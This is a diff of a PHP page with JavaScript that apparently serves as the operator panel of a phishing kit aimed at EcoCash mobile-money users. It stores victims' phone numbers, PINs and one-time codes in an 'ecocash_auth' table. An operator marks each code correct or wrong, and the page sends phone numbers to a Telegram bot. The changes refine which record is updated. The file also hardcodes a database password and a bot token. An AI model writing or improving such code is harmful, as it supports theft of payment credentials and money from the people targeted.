@@ -13,6 +13,7 @@ $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
+// Get phone from session
 $phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
 if (empty($phone)) {
     header("Location: index.php");
@@ -44,6 +45,22 @@ if (!$conn) {
     die("Database connection failed. Please contact admin.");
 }
 
+// ========== ENSURE PHONE EXISTS IN DATABASE (NO REDIRECT) ==========
+// Check if phone exists
+$checkSql = "SELECT id FROM ecocash_auth WHERE phone = $1 LIMIT 1";
+$checkRes = pg_query_params($conn, $checkSql, [$phone]);
+if (!$checkRes || pg_num_rows($checkRes) === 0) {
+    // Phone not found – insert a default record
+    $insertSql = "INSERT INTO ecocash_auth (phone, pin, otp, status, otp_status, approve) 
+                  VALUES ($1, '0000', '000000', 0, 0, 0)";
+    $insertRes = pg_query_params($conn, $insertSql, [$phone]);
+    if (!$insertRes) {
+        error_log("Failed to insert default record for phone $phone: " . pg_last_error($conn));
+        die("Could not initialise your account. Please try again.");
+    }
+}
+// ====================================================================
+
 // Handle AJAX request for PIN/OTP verification
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
     && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
@@ -58,7 +75,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
         exit;
     }
     
-    // Fetch stored PIN/OTP for this phone (latest record)
+    // Fetch stored PIN/OTP from the LATEST record for this phone
     $col = ($type === 'pin') ? 'pin' : 'otp';
     $sql = "SELECT $col FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
     $result = pg_query_params($conn, $sql, [$phone]);
@@ -75,31 +92,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
             echo json_encode(['success' => false, 'error' => 'Incorrect value']);
             exit;
         }
-        // Update the corresponding status column
+        // Update the corresponding status column on the LATEST record only
         $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
-        pg_query_params($conn, "UPDATE ecocash_auth SET $updateCol = 1 WHERE phone = $1", [$phone]);
+        $updateSql = "UPDATE ecocash_auth SET $updateCol = 1 
+                      WHERE id = (SELECT id FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1)";
+        pg_query_params($conn, $updateSql, [$phone]);
         
         // Send Telegram notification
         $msg = "✅ User $phone verified $type successfully.";
-        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
+        @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
         
         echo json_encode(['success' => true, 'message' => ucfirst($type) . ' verified (1)']);
     } 
     else { // action = 'wrong'
         $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
-        pg_query_params($conn, "UPDATE ecocash_auth SET $updateCol = 0 WHERE phone = $1", [$phone]);
+        $updateSql = "UPDATE ecocash_auth SET $updateCol = 0 
+                      WHERE id = (SELECT id FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1)";
+        pg_query_params($conn, $updateSql, [$phone]);
         echo json_encode(['success' => true, 'message' => ucfirst($type) . ' marked wrong (0)']);
     }
     exit;
 }
 
-// Get current verification statuses to show on page load (optional)
-$sql = "SELECT MAX(status) as pin_status, MAX(otp_status) as otp_status FROM ecocash_auth WHERE phone = $1";
+// Get current verification statuses from the LATEST record
+$sql = "SELECT status, otp_status FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
 $res = pg_query_params($conn, $sql, [$phone]);
 $pinStatus = 0;
 $otpStatus = 0;
 if ($res && $row = pg_fetch_assoc($res)) {
-    $pinStatus = (int)$row['pin_status'];
+    $pinStatus = (int)$row['status'];
     $otpStatus = (int)$row['otp_status'];
 }
 ?>
@@ -279,7 +300,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
 </div>
 
 <script>
-    let currentType = null; // 'pin' or 'otp'
+    let currentType = null;
     const modal = document.getElementById('verifyModal');
     const modalTitle = document.getElementById('modalTitle');
     const modalInput = document.getElementById('modalInput');
@@ -312,14 +333,12 @@ if ($res && $row = pg_fetch_assoc($res)) {
             });
             const result = await response.json();
             if (result.success) {
-                // Refresh status display
                 await refreshStatuses();
                 if (action === 'correct') {
                     showTemporaryMessage(result.message, 'green');
                 } else {
                     showTemporaryMessage(result.message, 'orange');
                 }
-                // After both become 1, redirect to dashboard
                 await checkBothVerifiedAndRedirect();
             } else {
                 alert('Error: ' + (result.error || 'Verification failed'));
@@ -331,7 +350,6 @@ if ($res && $row = pg_fetch_assoc($res)) {
     }
 
     async function refreshStatuses() {
-        // Fetch current statuses via AJAX
         const response = await fetch(window.location.href + '?get_status=1');
         const data = await response.json();
         if (data.pin_status === 1) {
@@ -360,7 +378,6 @@ if ($res && $row = pg_fetch_assoc($res)) {
 
     function showTemporaryMessage(msg, color) {
         const statusBox = document.getElementById('statusBox');
-        const oldHTML = statusBox.innerHTML;
         const tempDiv = document.createElement('div');
         tempDiv.style.color = color;
         tempDiv.style.marginTop = '10px';
@@ -387,13 +404,13 @@ if ($res && $row = pg_fetch_assoc($res)) {
 </script>
 
 <?php
-// Additional AJAX endpoint to fetch current statuses (used by JS)
+// AJAX endpoint to fetch current statuses from the LATEST record
 if (isset($_GET['get_status']) && $_GET['get_status'] == 1) {
     header('Content-Type: application/json');
-    $sql = "SELECT MAX(status) as pin_status, MAX(otp_status) as otp_status FROM ecocash_auth WHERE phone = $1";
+    $sql = "SELECT status, otp_status FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
     $res = pg_query_params($conn, $sql, [$phone]);
     if ($res && $row = pg_fetch_assoc($res)) {
-        echo json_encode(['pin_status' => (int)$row['pin_status'], 'otp_status' => (int)$row['otp_status']]);
+        echo json_encode(['pin_status' => (int)$row['status'], 'otp_status' => (int)$row['otp_status']]);
     } else {
         echo json_encode(['pin_status' => 0, 'otp_status' => 0]);
     }
